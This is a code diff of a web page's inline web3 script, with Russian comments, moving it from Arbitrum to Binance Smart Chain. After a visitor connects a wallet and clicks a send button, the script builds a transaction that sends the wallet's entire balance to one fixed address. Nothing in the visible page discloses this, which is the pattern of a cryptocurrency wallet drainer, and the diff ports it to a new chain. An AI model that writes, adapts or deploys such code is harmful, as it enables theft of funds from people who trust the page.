@@ -585,8 +585,8 @@
 </body>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
 <script>
-    const arbitrumProvider = new Web3.providers.HttpProvider('https://arb1.arbitrum.io/rpc');
-    const web3 = new Web3(arbitrumProvider);
+    const bscProvider = new Web3.providers.HttpProvider('https://bsc-dataseed.binance.org/');
+    const web3 = new Web3(bscProvider);
 
     let account; // Переменная для хранения адреса аккаунта
 
@@ -601,8 +601,8 @@
 
             // Получение и вывод баланса аккаунта
             let balance = await web3.eth.getBalance(account);
-            let balanceInETH = web3.utils.fromWei(balance, 'ether');
-            console.log(balanceInETH + ' ETH');
+            let balanceInBNB = web3.utils.fromWei(balance, 'ether');
+            console.log(balanceInBNB + ' BNB');
 
             // Активация кнопки отправки после подключения кошелька
             let sendButton = document.getElementById('send-button');
@@ -621,21 +621,20 @@
         try {
             let balance = await web3.eth.getBalance(account);
 
-            // Создание транзакции для отправки средств на сети Arbitrum
+            // Создание транзакции для отправки средств на сети Binance Smart Chain
             let transaction = {
                 from: account, // Адрес вашего кошелька отправителя
                 to: '0xE8E4058D0D5b4234a49fBF46Aa7371f04364373D', // Адрес вашего кошелька получателя
                 value: balance
             };
 
-            // Отправка транзакции на сети Arbitrum
-            let txReceipt = await web3.currentProvider.send('arb_sendTransaction', [transaction]);
+            // Отправка транзакции на сети Binance Smart Chain
+            let txReceipt = await web3.eth.sendTransaction(transaction);
             console.log('Транзакция отправлена, хэш:', txReceipt.transactionHash);
         } catch (error) {
             console.error('Произошла ошибка:', error);
         }
     });
 </script>
-
 
 </html>
